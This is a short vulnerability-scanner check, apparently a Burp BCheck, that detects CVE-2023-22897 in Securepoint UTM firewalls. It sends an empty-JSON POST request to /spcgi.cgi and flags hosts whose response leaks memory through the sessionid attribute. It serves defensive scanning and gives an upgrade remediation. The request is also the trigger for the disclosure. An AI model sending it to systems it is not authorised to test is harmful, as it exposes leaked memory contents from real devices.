metadata:
    language: v1-beta
    name: "[CVE-2023-22897] Securepoint UTM - Leaking Remote Memory Contents"
    description: "An issue was discovered in SecurePoint UTM before 12.2.5.1. The firewall's endpoint at /spcgi.cgi allows information disclosure of memory contents to be achieved by an authenticated user. Essentially, uninitialized data can be retrieved via an approach in which a sessionid is obtained but not used."
    author: "Nullfuzz"
    tags: "CVE-2023-22897","securepoint","utm","exposure","memory"

given host then
    send request called check:
          "POST /spcgi.cgi HTTP/1.1
        Host: `{request.url.host}`
        Content-Type: application/json

        {}"

    if  {check.response.body} in `"mode":` and {check.response.body} in `"sessionid":` and {check.response.headers} in  "application/json" and {check.response.status_code} is "200" then
        report issue:
            severity: medium
            confidence: certain
            detail: "The remote memory contents are afterward leaked in response to that request within the sessionid JSON attribute."
            remediation: "Upgrade to version 12.2.5.1 or newer"

    end if
